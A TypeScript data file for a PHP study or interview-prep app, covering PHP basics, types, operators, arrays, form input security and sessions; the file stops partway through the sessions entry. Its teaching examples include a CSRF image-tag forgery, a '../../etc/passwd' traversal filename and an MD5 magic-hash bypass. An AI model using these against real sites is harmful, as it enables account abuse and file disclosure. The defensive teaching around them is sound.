import type { InterviewQA } from '@/types';

export interface SpecificSectionData {
  explanation: string;
  realWorldExample: string;
  practicalUseCase: string;
  keyPoints: string[];
  interviewQA: InterviewQA[];
}

const php: Record<string, SpecificSectionData> = {
  'What is PHP': {
    explanation:
      'PHP (Hypertext Preprocessor) is a server-side scripting language that executes on the web server, not in the browser. It reads incoming HTTP requests, processes business logic, queries databases via PDO or MySQLi, manages sessions, and streams HTML or JSON back to the client. PHP follows a shared-nothing architecture — each HTTP request bootstraps a fresh PHP process with no memory of the previous one, unless you explicitly persist state via sessions, a cache layer like Redis, or a database.',
    realWorldExample:
      'When a user submits a login form on a Laravel-powered site, PHP reads `$_POST[\'email\']` and `$_POST[\'password\']`, queries the `users` table via PDO using a prepared statement, verifies the bcrypt hash with `password_verify()`, regenerates the session ID to prevent fixation, and redirects to the dashboard — all before the browser renders a single pixel of the next page.',
    practicalUseCase:
      'Create a file called `index.php`, start PHP\'s built-in server with `php -S localhost:8000`, then echo `"Hello, " . ($_GET["name"] ?? "World")`. Open `localhost:8000?name=Urjit` in your browser. You\'ve just built a dynamic web server in one file with zero configuration.',
    keyPoints: [
      'PHP 8.3 is the current stable release; it adds typed class constants, readonly properties on classes, and improved JIT.',
      'The Zend Engine interprets PHP; OPcache converts bytecode to native machine code (JIT) for CPU-heavy workloads.',
      'PHP is dynamically typed by default, but `declare(strict_types=1)` enforces type checking on function signatures.',
      'Superglobals (`$_GET`, `$_POST`, `$_SESSION`, `$_SERVER`) are always available without importing anything.',
      'PHP-FPM (FastCGI Process Manager) pools persistent worker processes so Apache/Nginx don\'t re-spawn PHP per request.',
      'Over 80% of the web runs PHP — WordPress, Drupal, Magento, Wikipedia, and Facebook\'s early codebase are all PHP.',
      'Composer is the standard dependency manager; `composer.json` defines packages, `composer.lock` pins exact versions.',
    ],
    interviewQA: [
      {
        question: 'Is PHP compiled or interpreted, and what does OPcache actually do?',
        answer:
          'PHP is interpreted: the Zend Engine parses your `.php` source into an AST, compiles it to Zend opcodes, then executes those opcodes. OPcache stores the compiled opcodes in shared memory so the parse-and-compile step is skipped on every subsequent request — this alone gives 3–5× throughput improvement. PHP 8.0 added JIT on top of OPcache, which compiles hot opcode sequences to native CPU instructions for CPU-intensive work like image processing or math, though for typical I/O-bound web requests the JIT benefit is marginal.',
        use_case: 'Enabling OPcache in production is the single highest-ROI PHP performance change. Set `opcache.validate_timestamps=0` in production so PHP never re-reads file mtimes.',
        follow_up: 'When would you enable JIT, and when would it actually hurt performance?',
      },
      {
        question: 'What is the difference between `==` and `===` in PHP, and why does it matter?',
        answer:
          '`==` performs type-juggling before comparison: `0 == "a"` is `true` in PHP 7, `"0" == false` is `true`, `null == 0` is `true`. `===` compares both value and type with no coercion: `0 === "a"` is `false`. In security-sensitive code (token comparison, role checks), always use `===` to avoid authentication bypasses caused by PHP\'s loose comparison rules.',
        use_case: 'A classic bug: `if ($token == $expected)` passes when `$token` is `0` and `$expected` is any non-numeric string because PHP casts the string to 0. Use `hash_equals()` for timing-safe string comparison instead.',
        follow_up: 'What does `hash_equals()` protect against that `===` does not?',
      },
      {
        question: 'What is a PHP superglobal, and name five of them?',
        answer:
          'Superglobals are built-in associative arrays that are accessible from any scope — inside functions, classes, and nested includes — without needing `global` keyword. The five most important: `$_GET` (URL query parameters), `$_POST` (request body form data), `$_SERVER` (server and execution environment info), `$_SESSION` (session data keyed by `session_start()`), and `$_FILES` (uploaded file metadata). Never trust superglobal data without sanitizing — they represent raw user input.',
        use_case: '`$_SERVER[\'HTTP_HOST\']` is commonly used to build redirect URLs, but it can be spoofed via the `Host` header. Always validate it against a whitelist of known domains.',
        follow_up: 'How would you safely use `$_SERVER[\'HTTP_HOST\']` without being vulnerable to Host header injection?',
      },
      {
        question: 'Explain PHP\'s request lifecycle from nginx to your echo statement.',
        answer:
          'An HTTP request hits nginx, which matches the `.php` URI and passes it to PHP-FPM via FastCGI. FPM picks an idle worker from its process pool, sets environment variables (`$_SERVER`, `$_GET`, etc.) from the FastCGI params, and begins executing the script. OPcache provides cached opcodes if available. PHP runs top-to-bottom, any output buffering wraps `echo`/`print`, and at script end PHP sends headers + buffered body to FPM, which sends it back to nginx, which forwards to the browser. The PHP worker returns to the pool.',
        use_case: 'Understanding this pipeline explains why `header()` must be called before any output — HTTP headers must precede the body, and once PHP starts sending the body buffer, headers can no longer be changed.',
        follow_up: 'What does `ob_start()` do, and when would you use output buffering intentionally?',
      },
      {
        question: 'What changed between PHP 7 and PHP 8, and which features matter most day-to-day?',
        answer:
          'PHP 8.0 brought: named arguments (`createUser(name: "Alice")`), match expressions (like switch but strict and exhaustive), nullsafe operator (`$user?->getAddress()?->city`), union types (`int|string`), and attributes (native annotations). PHP 8.1 added: enums, readonly properties, never return type, fibers. PHP 8.2 added: readonly classes, disjunctive normal form types. PHP 8.3 added: typed class constants, `json_validate()`, and `#[Override]` attribute. Day-to-day, named arguments and nullsafe operator eliminate the most boilerplate.',
        use_case: 'Replacing a chain of `if ($user && $user->getAddress())` null checks with `$user?->getAddress()?->city` is a direct code quality win from PHP 8\'s nullsafe operator.',
        follow_up: 'How do PHP 8 enums differ from class constants, and when would you choose one over the other?',
      },
    ],
  },

  'PHP Setup and Environment': {
    explanation:
      'PHP runs in two modes: CGI/FPM (web server integration) and CLI (command line). For local development, PHP\'s built-in server (`php -S localhost:8000`) requires zero configuration — it serves a single-threaded HTTP server from the current directory. Production stacks use Nginx + PHP-FPM, where FPM maintains a pool of long-lived PHP processes. Configuration lives in `php.ini`; key settings include `display_errors` (off in production), `error_reporting`, `memory_limit`, `upload_max_filesize`, and `opcache.*` settings.',
    realWorldExample:
      'A new developer joins a Laravel project. Instead of installing PHP globally, they run `docker compose up` — a `docker-compose.yml` defines an `php:8.3-fpm` service with php.ini overrides mounted as a volume, an nginx service configured to forward `.php` requests to FPM, and a MySQL service. Every developer gets an identical environment regardless of their OS, eliminating "works on my machine" issues.',
    practicalUseCase:
      'Install PHP 8.3 via Homebrew (`brew install php`), run `php --version` to confirm, then run `php -r "echo ini_get(\'memory_limit\');"` to check php.ini settings from CLI. Start `php -S localhost:8000` and verify PHP info at `localhost:8000/info.php` with `<?php phpinfo();`.',
    keyPoints: [
      '`php.ini` has two contexts: CLI (`php --ini`) and FPM/Apache — they often have different configs, which causes production surprises.',
      'PHP-FPM pool settings (`pm.max_children`, `pm.start_servers`) control concurrency — too low causes 502 errors under load.',
      'Extensions (pdo_mysql, mbstring, gd, intl) must be enabled in php.ini; docker images often ship with all common ones pre-installed.',
      '`composer` requires PHP CLI — check `php --version` and `composer --version` match the web server PHP version.',
      'Xdebug disables OPcache by default; never run Xdebug in production — it adds 3–5× overhead.',
      '`php -l file.php` checks syntax without executing — useful in CI pipelines as a cheap lint step.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between PHP-FPM and Apache mod_php?',
        answer:
          'mod_php embeds the PHP interpreter directly into each Apache worker process. Every Apache child process carries a full PHP runtime in memory, even for requests serving static files. PHP-FPM is a standalone FastCGI daemon with its own process pool. Apache or Nginx passes only `.php` requests to FPM via socket/TCP; static files are served directly by the web server without involving PHP at all. FPM is more resource-efficient, allows separate user/group for PHP processes, and supports dynamic/static/ondemand process management.',
        follow_up: 'How does PHP-FPM\'s `ondemand` process manager differ from `dynamic`, and when would you use it?',
      },
      {
        question: 'What are the most important php.ini settings to change before going to production?',
        answer:
          'Set `display_errors = Off` and `log_errors = On` — never expose stack traces to end users. Set `error_reporting = E_ALL` and configure `error_log` to a writable path. Enable `opcache.enable = 1` with `opcache.validate_timestamps = 0`. Set `memory_limit` based on your app\'s needs (128M is often too low for complex Laravel apps; 256M–512M is typical). Set `expose_php = Off` to remove the `X-Powered-By: PHP` response header. Configure `date.timezone` to match your app\'s expected timezone.',
        follow_up: 'Why is `opcache.validate_timestamps = 0` dangerous in development but critical in production?',
      },
      {
        question: 'Why might a script work perfectly in CLI but fail when run via the web server?',
        answer:
          'CLI and web server PHP use separate `php.ini` files with different settings. Common causes: different `memory_limit`, different `max_execution_time` (CLI often has none), different loaded extensions, different working directory (CLI uses the script\'s directory, FPM uses the web root), different user permissions (CLI runs as you, FPM runs as `www-data`), and different environment variables. Also, `$_GET`/`$_POST` are empty in CLI, and `echo` goes to stdout rather than the HTTP response buffer.',
        follow_up: 'How would you debug a script that works in CLI but returns a 500 error via the web server?',
      },
    ],
  },

  'Syntax, Variables, and Data Types': {
    explanation:
      'PHP variables are prefixed with `$` and are dynamically typed — the same variable can hold an integer, then a string, then an array. PHP has 8 scalar and compound types: `int`, `float`, `string`, `bool`, `array`, `object`, `callable`, and `null`. Since PHP 7.4, you can declare property types on classes. Since PHP 8.0, you can declare union types (`int|string`). Enabling `declare(strict_types=1)` at the top of a file makes PHP enforce declared types strictly, throwing a `TypeError` instead of silently casting.',
    realWorldExample:
      'A product price arrives from a form as the string `"19.99"`. Without `strict_types`, PHP silently casts it to float `19.99` in arithmetic. With `strict_types=1` and a typed function `function applyDiscount(float $price)`, passing the string throws a `TypeError` immediately, forcing you to cast or validate at the boundary where the data enters — not buried in business logic.',
    practicalUseCase:
      'Write a function `typeDump(mixed $val): string` that returns the type and value of anything passed to it using `gettype()` and `var_export()`. Call it with `0`, `"0"`, `false`, `null`, `[]`, and observe how PHP distinguishes them — then test `0 == false`, `"" == null`, `"0" == false` with loose comparison to see PHP\'s type juggling in action.',
    keyPoints: [
      'PHP has 8 types: bool, int, float, string, array, object, callable, null — plus `mixed`, `never`, `void` as special types.',
      '`declare(strict_types=1)` must be the very first statement in a file; it applies only to that file, not included files.',
      'Null coalescing operator `??` is the idiomatic way to handle nullable values: `$name = $_GET["name"] ?? "Guest"`.',
      'Type casting: `(int)"42px"` returns `42`; `(int)"abc"` returns `0` — casting is lossy and silent.',
      'PHP strings are byte arrays, not Unicode sequences; use `mb_strlen()` and `mb_substr()` for multibyte character operations.',
      '`heredoc` syntax allows multi-line strings with variable interpolation; `nowdoc` is the same but with no interpolation (like single quotes).',
      'Variable variables (`$$varName`) exist but are a code smell — avoid them in application code.',
    ],
    interviewQA: [
      {
        question: 'What is PHP type juggling and why is it a security risk?',
        answer:
          'PHP\'s loose comparison (`==`) converts operands to a common type before comparing: `"1" == 1` is true, `0 == "abc"` is true (PHP 7), `"0e123" == "0e456"` is true (both treated as scientific notation = 0). This becomes a security risk in hash comparisons: if an MD5 hash starts with `0e`, PHP\'s loose compare treats it as 0 and any other `0e`-prefixed hash matches. Always use `===` for security-sensitive comparisons and `hash_equals()` for timing-safe token comparison.',
        use_case: 'CVE-style example: `if (md5($token) == $expected)` where `$expected = "0e462097431906509019562988736854"` — any token whose MD5 also starts with `0e` will pass the check incorrectly.',
        follow_up: 'How does `hash_equals()` protect against both type juggling and timing attacks?',
      },
      {
        question: 'When would you use a PHP `array` vs a class/object?',
        answer:
          'Use arrays for simple, temporary data structures: query result rows, config key-value pairs, list of IDs. Use classes (objects) when the data has behavior (methods), invariants to enforce (the balance can\'t go negative), or needs type safety (passing a `Money` object to functions, not an ambiguous array). PHP arrays are value-typed (copied on assignment unless referenced) while objects are reference-typed (assigned/passed by reference handle). For performance, arrays are faster to create but classes are faster to access named fields due to fixed property slot offsets.',
        follow_up: 'What is the copy-on-write optimization PHP uses for arrays, and when does it actually copy?',
      },
      {
        question: 'What is the difference between single-quoted and double-quoted strings in PHP?',
        answer:
          'Single-quoted strings are literal — only `\\\\` and `\\\'` are escape sequences; no variable interpolation. Double-quoted strings support variable interpolation (`"Hello $name"`), complex expressions (`"Hello {$user->name}"`), and escape sequences (`\\n`, `\\t`, `\\u{1F600}`). Single-quoted strings are marginally faster because PHP doesn\'t scan for variables to interpolate, though the difference is negligible in modern PHP. Prefer single quotes for string literals that don\'t need interpolation — it signals clearly to the reader that no dynamic substitution occurs.',
        follow_up: 'When would you use nowdoc syntax over heredoc syntax?',
      },
    ],
  },

  'Operators and Expressions': {
    explanation:
      'PHP\'s operator set includes arithmetic, assignment, comparison, logical, string, array, and bitwise operators. Key PHP-specific operators: the null coalescing operator `??` returns the left side if it exists and is not null, otherwise the right side; the spaceship operator `<=>` returns -1, 0, or 1 for sorting; the nullsafe operator `?->` short-circuits a method chain if any step is null. PHP evaluates expressions using operator precedence — `&&` binds tighter than `and`, `||` tighter than `or`, which causes surprising bugs when mixing them.',
    realWorldExample:
      'In a Laravel controller, `$perPage = $request->integer("per_page") ?: 20;` uses the ternary shorthand to default to 20 if `per_page` is 0 or empty. But `$user = User::find($id) ?? abort(404)` uses null coalescing — if `find()` returns null, it calls `abort()`. These are different operators with different semantics: `?:` checks truthiness, `??` checks existence/null.',
    practicalUseCase:
      'Write a `usort()` callback using the spaceship operator to sort a list of products by price ascending, then by name alphabetically when prices are equal: `usort($products, fn($a, $b) => [$a["price"], $a["name"]] <=> [$b["price"], $b["name"]])`. This is a PHP-idiomatic multi-key sort in one line.',
    keyPoints: [
      'Spaceship `<=>` returns -1/0/1, making it ideal for `usort()` callbacks — replaces verbose if-else comparison chains.',
      'Null coalescing `??` only checks for null/undefined; ternary shorthand `?:` checks truthiness (falsy values like 0, "" also trigger fallback).',
      'Nullsafe operator `?->` short-circuits the chain: `$user?->getAddress()?->city` returns null at the first null without throwing.',
      '`and`/`or` have lower precedence than `=`: `$x = true and false` assigns `true` to `$x` (assignment happens first).',
      'String concatenation uses `.` not `+`: `"Hello" + " World"` returns `0` in PHP (arithmetic on non-numeric strings).',
      'Pre-increment `++$i` increments then returns; post-increment `$i++` returns then increments — matters in complex expressions.',
      'Bitwise operators (`&`, `|`, `^`, `~`, `<<`, `>>`) operate on integer bit representations; useful for flags and permissions.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between `??` and `?:` in PHP?',
        answer:
          '`??` (null coalescing) returns the left operand if it exists and is not `null`, otherwise the right. It does NOT trigger for falsy values like `0`, `""`, or `false`. `?:` (ternary shorthand / Elvis operator) returns the left operand if it is truthy, otherwise the right — it triggers for any falsy value including `0` and empty string. Example: `$count = $data["count"] ?? 0` returns the value even if it\'s `0`. `$count = $data["count"] ?: 0` would replace `0` with `0` (same result here, but would also replace `""` or `false` unintentionally).',
        use_case: 'When reading a page number from a URL (`$page = (int)($_GET["page"] ?? 1)`), use `??` — if the user explicitly passes `?page=0`, you want to know that, not silently replace it.',
        follow_up: 'Can you chain `??` operators? What does `$a ?? $b ?? $c` evaluate to?',
      },
      {
        question: 'How does the spaceship operator simplify sorting in PHP?',
        answer:
          'The spaceship operator `<=>` compares two values and returns -1, 0, or 1 — exactly what `usort()` needs. Before PHP 7, you\'d write `function cmp($a, $b) { if ($a == $b) return 0; return $a < $b ? -1 : 1; }`. With spaceship: `usort($arr, fn($a, $b) => $a <=> $b)`. For multi-key sorts, use array comparison: `fn($a, $b) => [$a->lastName, $a->firstName] <=> [$b->lastName, $b->firstName]` — PHP compares arrays element-by-element, so this naturally sorts by last name, then first name.',
        follow_up: 'How does PHP\'s array comparison work, and what happens when you compare arrays of different lengths?',
      },
    ],
  },

  'Control Flow Statements': {
    explanation:
      'PHP provides `if/elseif/else`, `switch`, `match` (PHP 8+), `while`, `do-while`, `for`, `foreach`, and `break`/`continue` with optional numeric levels. The `match` expression differs from `switch` in three critical ways: it uses strict comparison (no type juggling), each arm must be exhaustive (throws `UnhandledMatchError` if no arm matches), and each arm is an expression not a statement — no fall-through, no break needed. `foreach` works on arrays and objects implementing `Traversable`; it copies the array by value unless you pass by reference.',
    realWorldExample:
      'In a billing system, a payment status field drives behavior. Using `match`: `$action = match($payment->status) { "pending" => $this->charge($payment), "failed" => $this->notifyTeam($payment), "refunded" => $this->reverseEntry($payment), default => throw new UnexpectedValueException("Unknown status: {$payment->status}") }`. Unlike `switch`, a missing case throws immediately — no silent no-op from a forgotten `break`.',
    practicalUseCase:
      'Build a FizzBuzz using `match` instead of if-else: `match(true) { $i % 15 === 0 => "FizzBuzz", $i % 3 === 0 => "Fizz", $i % 5 === 0 => "Buzz", default => (string)$i }`. This shows how `match` evaluates conditions, not just values, making it far more flexible than `switch`.',
    keyPoints: [
      '`match` uses `===` strict comparison; `switch` uses `==` loose comparison — swapping them can introduce type-juggling bugs.',
      '`foreach ($arr as &$item)` passes by reference — you MUST `unset($item)` after the loop or the last element gets overwritten on next use.',
      '`break 2` / `continue 2` break out of or skip two levels of nested loops — useful in nested foreach over query results.',
      '`match` throws `UnhandledMatchError` for unmatched values unless you provide a `default` arm.',
      'The `for` loop evaluates the condition before each iteration; `do-while` executes at least once before checking the condition.',
      'PHP 8.1\'s `match` on enums: `match($status) { Status::Active => ..., Status::Banned => ... }` — exhaustive enum matching.',
    ],
    interviewQA: [
      {
        question: 'How does `match` differ from `switch` in PHP 8?',
        answer:
          'Four key differences: (1) `match` uses strict `===` comparison; `switch` uses loose `==`. (2) `match` is an expression that returns a value; `switch` is a statement. (3) `match` has no fall-through — each arm is self-contained; `switch` requires `break` to prevent fall-through. (4) `match` throws `UnhandledMatchError` if no arm matches and there\'s no `default`; `switch` silently does nothing. For business logic with enum-like values, `match` is safer and more readable.',
        use_case: 'Replacing a `switch` on HTTP status codes with `match` eliminates the bug where a forgotten `break` causes two actions to run for one status.',
        follow_up: 'Can a `match` arm match multiple values, and how?',
      },
      {
        question: 'What is the `foreach` reference bug in PHP?',
        answer:
          'When you use `foreach ($items as &$item)`, `$item` is a reference to each array element. After the loop ends, `$item` still holds a reference to the LAST element of the array. If you then use `foreach ($items as $item)` in a second loop, the last element of `$items` gets overwritten by each iteration of the second loop because `$item` is still a reference. The fix: always `unset($item)` immediately after any `foreach` that uses a reference variable.',
        follow_up: 'When would you intentionally use `foreach` by reference instead of re-assigning elements?',
      },
    ],
  },

  'Functions and Scope': {
    explanation:
      'PHP functions have three scoping mechanisms: local scope (default), `global` keyword to access global variables, and `static` keyword to preserve a local variable between calls. Closures in PHP are `Closure` objects — they do not capture outer scope automatically; you must explicitly `use ($var)` to bring variables in. Arrow functions (`fn() =>`) automatically capture outer scope by value without needing `use`. PHP supports first-class callables since 8.1: `array_map(strlen(...), $strings)` passes named functions as callables without wrapping them in closures.',
    realWorldExample:
      'A Laravel service class uses a static cache inside a method: `static $cache = []; if (isset($cache[$id])) return $cache[$id];` — this caches results per request lifecycle without a Redis round-trip, because PHP\'s static variables persist for the duration of the script (one HTTP request). A second call to `findUser(5)` within the same request returns instantly from the static cache.',
    practicalUseCase:
      'Write a `memoize()` higher-order function that takes any callable and returns a new function that caches results by serialized arguments: use a `static $cache = []` inside a returned closure. Call `$memoizedFib = memoize("fib")` and benchmark — the memoized version should compute `fib(40)` in microseconds instead of seconds.',
    keyPoints: [
      'PHP closures capture outer scope by value via `use ($var)` — changes inside the closure don\'t affect the outer variable.',
      'Use `use (&$var)` to capture by reference when the closure needs to modify the outer variable.',
      'Arrow functions `fn() =>` capture all outer variables automatically by value — they cannot capture by reference.',
      '`static` variables in functions persist between calls within the same request, not across requests.',
      'PHP supports variadic functions with `...$args` — `function sum(int ...$nums)` receives all extra arguments as an array.',
      'Named arguments (PHP 8.0): `array_slice(array: $items, offset: 2, length: 5)` — skip optional parameters by name.',
      '`callable` type accepts function names as strings, arrays `[$obj, "method"]`, or `Closure` objects.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between a PHP closure and an arrow function?',
        answer:
          'Both create anonymous functions. A closure (`function() use ($x) {...}`) must explicitly declare which outer variables to capture using `use`, and can capture by reference with `use (&$x)`. An arrow function (`fn() => $x * 2`) automatically captures ALL variables from the outer scope by value — you cannot capture by reference. Arrow functions are limited to a single expression (the return value) and are primarily designed for short, inline callbacks like `array_map(fn($item) => $item * 2, $arr)`. Use closures when you need multiple statements, mutations, or selective capture.',
        use_case: 'In Laravel collection pipes: `$prices->map(fn($p) => $p * $taxRate)` — the arrow function captures `$taxRate` automatically without `use ($taxRate)`.',
        follow_up: 'Can you use `static` inside an arrow function, and what would that even mean?',
      },
      {
        question: 'What is a PHP first-class callable, and why was it added in PHP 8.1?',
        answer:
          'First-class callables let you reference named functions, static methods, and instance methods as `Closure` objects using the `...` syntax: `strlen(...)`, `MyClass::staticMethod(...)`, `$obj->method(...)`. Before 8.1, you had to wrap them: `fn($s) => strlen($s)` or `"strlen"` (a string, which is not a `Closure`). First-class callables are IDE-friendly (IDEs know the type), refactoring-safe (renaming `strlen` would update `strlen(...)` but not `"strlen"`), and avoid the overhead of a wrapper closure.',
        follow_up: 'What is the difference between passing `"strlen"` as a callable and passing `strlen(...)`?',
      },
    ],
  },

  'Arrays and Associative Arrays': {
    explanation:
      'PHP\'s `array` type is a single data structure that functions as both indexed arrays and hash maps (associative arrays). Internally, PHP arrays are ordered hash maps — insertion order is preserved even for numeric keys. Keys can be integers or strings; values can be any type, including nested arrays. PHP provides over 70 built-in array functions: `array_map`, `array_filter`, `array_reduce`, `usort`, `array_chunk`, `array_combine`, and more. Arrays are copied by value on assignment — `$b = $a; $b[] = "extra"` does not modify `$a`.',
    realWorldExample:
      'A REST API endpoint returns a list of products. PHP builds the response with: `$products = array_map(fn($row) => ["id" => $row["id"], "name" => $row["name"], "price" => (float)$row["price"]], $rows)`. Then `usort($products, fn($a, $b) => $a["price"] <=> $b["price"])` sorts by price. `array_filter($products, fn($p) => $p["price"] > 0)` removes free items. Three array functions chain together to build a clean, sorted, filtered API response.',
    practicalUseCase:
      'Build a word-frequency counter: take a paragraph string, split it with `str_word_count($text, 1)`, use `array_count_values()` to count occurrences, `arsort()` to sort by frequency descending, and `array_slice()` to take the top 10 words. This chains five array functions in under 10 lines — a common PHP interview exercise.',
    keyPoints: [
      'PHP arrays are ordered hash maps — integer and string keys are both valid, insertion order is preserved.',
      '`array_map()` returns a new array; `array_walk()` modifies in place and always passes by reference.',
      '`array_filter()` without a callback removes falsy values — this can accidentally remove legitimate `0` or `""` values.',
      'Negative array indices do NOT count from the end in PHP: `$arr[-1]` is a key named `-1`, not the last element.',
      '`count()` is O(1) for flat arrays (PHP stores count as metadata); it is O(n) for nested arrays with `COUNT_RECURSIVE`.',
      '`list()` / `[...]` destructuring: `[$first, $second] = ["Alice", "Bob"]` — useful for unpacking function return values.',
      'Spread operator: `$merged = [...$arr1, ...$arr2]` is equivalent to `array_merge()` but more readable.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between `array_map` and `array_walk` in PHP?',
        answer:
          '`array_map()` applies a callback to each element and returns a NEW array with the results — the original array is unchanged. You can pass multiple arrays to map over in parallel. `array_walk()` applies a callback that receives the value AND key by reference, modifying the original array in place, and always returns `true`/`false`. Use `array_map` when you want a transformed copy; use `array_walk` when you need to mutate elements in place with access to their keys.',
        use_case: 'Formatting price display: `$formatted = array_map(fn($p) => number_format($p, 2), $prices)` — original `$prices` unchanged, `$formatted` has the formatted strings.',
        follow_up: 'What happens if you pass `null` as the callback to `array_map` with two arrays?',
      },
      {
        question: 'How does PHP array copy-on-write work, and when does the actual copy happen?',
        answer:
          'When you assign one array to another (`$b = $a`), PHP does NOT immediately copy the data. Both variables share the same underlying hash table with a reference count of 2. The actual copy only happens when you WRITE to either variable (copy-on-write). This means read-only operations on copied arrays are free. The copy happens at the point of modification — `$b[] = "extra"` triggers the copy just before adding the element. This is why PHP arrays are efficient to pass around for reading but can spike memory when a large array is modified.',
        follow_up: 'If you pass an array to a function and modify it inside the function, does the caller\'s copy change?',
      },
      {
        question: 'What does `array_filter()` do when no callback is provided, and what bugs does that cause?',
        answer:
          '`array_filter($arr)` with no callback removes all values that evaluate to `false` in a boolean context: `null`, `false`, `0`, `0.0`, `""`, `"0"`, and `[]`. This is a common source of bugs when filtering arrays that legitimately contain `0` or empty string as valid values. For example, `array_filter(["name" => "", "age" => 0, "active" => true])` returns only `["active" => true]`, silently dropping `age => 0`. Always pass an explicit callback when your data may contain legitimate falsy values.',
        follow_up: 'Does `array_filter()` preserve array keys, and how do you reset them?',
      },
    ],
  },

  'Forms and User Input Handling': {
    explanation:
      'PHP processes HTML form submissions through `$_POST` (for `method="POST"`) and `$_GET` (for `method="GET"` or URL query strings). Every value in these superglobals is a string — even numbers. PHP provides `filter_input()` for safe extraction with built-in sanitization/validation filters, and `filter_var()` for validating or sanitizing individual values. Never trust any input from these arrays: validate type, range, length, and format; sanitize before storing or echoing. The golden rule: validate early, sanitize on output, use prepared statements for database queries.',
    realWorldExample:
      'A registration form posts `name`, `email`, and `age`. PHP reads: `$name = trim(filter_input(INPUT_POST, "name", FILTER_SANITIZE_SPECIAL_CHARS) ?? "")`. Validates: `strlen($name) < 2 && throw new ValidationException("Name too short")`. Email: `filter_var($email, FILTER_VALIDATE_EMAIL)`. Age: `filter_input(INPUT_POST, "age", FILTER_VALIDATE_INT, ["options" => ["min_range" => 13, "max_range" => 120]])`. All validation happens before any database write.',
    practicalUseCase:
      'Build a form that accepts a URL from the user, validates it with `FILTER_VALIDATE_URL`, confirms it starts with `https://`, and fetches its title tag using `file_get_contents()` with a 5-second timeout set via `stream_context_create()`. This covers input validation, SSRF prevention (https-only), and safe remote requests.',
    keyPoints: [
      'All `$_POST` and `$_GET` values are strings — never assume type without casting or using `filter_input` with a type filter.',
      '`filter_input(INPUT_POST, "age", FILTER_VALIDATE_INT)` returns `null` if the key is absent, `false` if it fails validation, or the validated value.',
      'CSRF protection: generate a token with `bin2hex(random_bytes(32))`, store in session, verify on POST — every state-changing form needs this.',
      '`htmlspecialchars($value, ENT_QUOTES, "UTF-8")` before echoing user input to prevent XSS.',
      '`filter_var($email, FILTER_VALIDATE_EMAIL)` only validates format — it does not check if the email address actually exists.',
      'For file uploads, check `$_FILES["photo"]["error"] === UPLOAD_ERR_OK` before processing — never trust `$_FILES["photo"]["name"]` as a safe path.',
      '`$_REQUEST` merges `$_GET`, `$_POST`, and `$_COOKIE` — avoid it in production as it creates ambiguity about data source.',
    ],
    interviewQA: [
      {
        question: 'What is CSRF and how do you prevent it in PHP forms?',
        answer:
          'Cross-Site Request Forgery tricks an authenticated user\'s browser into making a malicious request to your application. Prevention: generate a cryptographically random token with `bin2hex(random_bytes(32))`, store it in `$_SESSION["csrf_token"]`, embed it as a hidden input field in every form, and verify on POST that `$_POST["csrf_token"] === $_SESSION["csrf_token"]` using `hash_equals()` (to prevent timing attacks). Regenerate the token after each use. For APIs, use the `SameSite=Strict` cookie attribute and check `Origin`/`Referer` headers as an additional layer.',
        use_case: 'A banking app without CSRF protection: an attacker embeds `<img src="bank.com/transfer?to=attacker&amount=1000">` on a malicious page — if the user is logged in, the browser sends their session cookie, executing the transfer.',
        follow_up: 'Why must you use `hash_equals()` instead of `===` for CSRF token comparison?',
      },
      {
        question: 'How would you safely handle file uploads in PHP?',
        answer:
          'Seven steps: (1) Check `$_FILES["file"]["error"] === UPLOAD_ERR_OK`. (2) Validate MIME type using `finfo_file()`, not `$_FILES["file"]["type"]` which is user-controlled. (3) Check file size against `$_FILES["file"]["size"]` AND your own limit — don\'t rely on `upload_max_filesize` alone. (4) Generate a new UUID or hash-based filename — never use `$_FILES["file"]["name"]` directly as it can contain path traversal sequences like `../../etc/passwd`. (5) Move the file with `move_uploaded_file()` which validates it\'s a real upload. (6) Store files outside the web root so they\'re not directly accessible. (7) Serve through a PHP proxy that sets `Content-Type` from your trusted MIME check.',
        follow_up: 'Why is it dangerous to store user-uploaded files inside the web root even if you rename them?',
      },
      {
        question: 'What is the difference between sanitizing and validating input?',
        answer:
          'Validation checks whether data meets requirements: is this a valid email format? Is this integer within range 1–100? If not, you reject the input and return an error. Sanitization transforms data to make it safe for a specific context: strip HTML tags before storing in a plain-text field, escape special characters before inserting into HTML, use prepared statements before inserting into SQL. The order matters: validate first to reject bad data early, then sanitize at the point of use for the specific output context. A value can pass validation but still need context-specific sanitization — an email address is valid but needs HTML-escaping when displayed in a page.',
        follow_up: 'Should you sanitize input before storing it in the database, or should you store raw and sanitize on output?',
      },
    ],
  },

  'Sessions and Cookies': {
    explanation:
      'PHP sessions store data server-side (by default in files under `/tmp`) and give the browser a session ID via a cookie (`PHPSESSID`). On subsequent requests, PHP reads the cookie, loads the session file, and populates `$_SESSION`. Cookies store data directly in the browser and are sent with every request to the matching domain. Sessions are for sensitive, server-verified state (user ID, roles, CSRF tokens). Cookies are for preferences and long-lived client-side data (remember me, analytics). In production, session storage must move to Redis or Memcached to support horizontal scaling across multiple servers.',
    realWorldExample:
      'A user logs into an e-commerce site. PHP calls `session_start(["cookie_secure" => true, "cookie_httponly" => true, "cookie_samesite" => "Lax"])`, runs `session_regenerate_id(true)` to prevent session fixation, then stores `$_SESSION["user_id"] = $user->id` and `$_SESSION["role"] = $user->role`. On every subsequent page load, a middleware checks `$_SESSION["user_id"]` exists and the user is still active in the database — if not, it destroys the session and redirects to login.',
    practicalUseCase:
      'Implement a login counter: start a session, increment `$_SESSION["logins"] = ($_SESSION["logins"] ?? 0) + 1`, and display "You\'ve visited X times this session." Then implement a "remember me" feature using `setcookie("remember_token", $token, ["expires" => time() + 30*24*3600, "secure" => true, "httponly" => true, "samesite" => "Lax"])` and a corresponding `remember_tokens` database table.',
    keyPoints: [
      '`session_start()` must be called before any output — headers must be sent before the body starts.',
      '`session_regenerate_id(true)` MUST be called after login to prevent session fixation attacks.',
      'Session files are world-readable by default on shared hosts — use `session_set_save_handler()` to store in Redis.',
      'Cookie `HttpOnly` flag prevents JavaScript from reading the cookie — essential for session cookies.',
      'Cookie `SameSite=Strict` prevents CSRF from cross-origin requests; `Lax` allows top-level navigations (normal links).',
      'PHP\'s default session garbage collection is probabilistic (`session.gc_probability / session.gc_divisor`) — not every request cleans up expired sessions.',
      'For multi-server deployments, PHP sessions in files fail — configure `session.save_handler = redis` with `session.save_path = "tcp://redis:6379"`.',
    ],
    interviewQA: [
      {
        question: 'What is session fixation and how does `session_regenerate_id()` prevent it?',
        answer:
